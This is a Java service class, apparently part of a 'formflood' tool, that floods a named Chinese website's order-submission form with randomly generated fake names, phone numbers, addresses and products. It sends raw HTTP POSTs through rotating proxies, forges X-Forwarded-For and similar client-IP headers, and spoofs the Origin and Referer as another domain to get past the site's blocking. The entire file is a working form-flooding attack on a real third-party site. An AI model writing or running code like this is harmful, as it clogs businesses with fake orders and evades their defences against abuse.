package com.ec.formflood.flood.DgDuoshoujieCN;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.InitializingBean;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;

import com.ec.formflood.flood.FloodSocket;
import com.ec.formflood.model.ProxyType;
import com.ec.formflood.random.RProduct;

@Service("dgDuoshoujieCN_SOC")
public class DgDuoshoujieCN_SOC extends FloodSocket implements InitializingBean {
	
	protected static final Logger LOGGER = LoggerFactory.getLogger(DgDuoshoujieCN_SOC.class);


	static final String url = "http://dg.duoshoujie.cn/fopai/submit.asp";
	
	@Autowired
	@Qualifier("dgDuoshoujieCNProduct")
	RProduct product;
	

	@Override
	public String getUrl() {
		return url;
	}

	@Override
	public void flooding() {
		
		setProxy(randomProxy.random());
		
		List<NameValuePair> params = new ArrayList<NameValuePair>();
		 params.add(new BasicNameValuePair("fname", name.random()));
		 params.add(new BasicNameValuePair("ftel", telephone.random().toString()));
		 params.add(new BasicNameValuePair("faddress", address.random().toString()));
		 params.add(new BasicNameValuePair("fchanpin", product.random().toString()));
		 params.add(new BasicNameValuePair("remark", comment.random().toString()));
		
		
		try {
			String data=getQuery(params);
			
			StringBuilder outsb=new StringBuilder("POST /fopai/submit.asp HTTP/1.1").append("\r\n");
			
			outsb.append("Host:").append(uri.getHost()).append("\r\n");
			if(getProxy()!=null){
				outsb.append("X-Forwarded-For:").append(getProxy().getHost()).append("\r\n"); 
				outsb.append("Proxy-Client-IP:").append(getProxy().getHost()).append("\r\n"); 
				outsb.append("WL-Proxy-Client-IP:").append(getProxy().getHost()).append("\r\n"); 
			}
			outsb.append("Content-Length:").append(data.length()).append("\r\n"); 

			
			outsb.append("Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8").append("\r\n"); 
			outsb.append("Accept-Encoding:gzip, deflate").append("\r\n"); 
			outsb.append("Accept-Language:zh-CN,zh;q=0.8").append("\r\n"); 
			outsb.append("Cache-Control:no-cache").append("\r\n"); 
			outsb.append("Content-Type:application/x-www-form-urlencoded").append("\r\n"); 
			outsb.append("Pragma:no-cache").append("\r\n"); 
			outsb.append("Upgrade-Insecure-Requests:1").append("\r\n"); 
			outsb.append("Origin:http://m.kmdjsm.cn").append("\r\n"); 
			outsb.append("Proxy-Connection:keep-alive").append("\r\n"); 
			outsb.append("Referer:http://m.kmdjsm.cn/").append("\r\n"); 
			outsb.append("User-Agent:Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36").append("\r\n"); 
			outsb.append("X-Requested-With:XMLHttpRequest").append("\r\n"); 
			
	        outsb.append("\r\n");
			outsb.append(data);
			
			
			BufferedWriter out = new BufferedWriter(new OutputStreamWriter(this.socket.getOutputStream()));
			out.write(outsb.toString());
			out.flush();
			//out.write("\r\n");  
			//out.flush();  
			
			System.err.println("pos:\r\n"+outsb); 
			 
			//System.err.println("rev:\r\n"+decode(socket.getInputStream()));
			
			InputStream is=socket.getInputStream();
			
			
			System.err.println("rev:\r\n");
			
			 Map<String, String> headers =readHeaders(is);
			System.err.println(headers);

			//System.err.println(new String(	decode(	readBody(is,Integer.parseInt(readHeaders(is).get("Content-Length"))))));
			System.err.println(new String(	readBody(is,Integer.parseInt(headers.get("Content-Length")))));

		
			
		} catch (IOException e) {
			LOGGER.error(e.getMessage(),e);
		}finally{
			params.clear();
			setProxy(randomProxy.random(ProxyType.SOCKS));
		}

	}
	
	
	

}
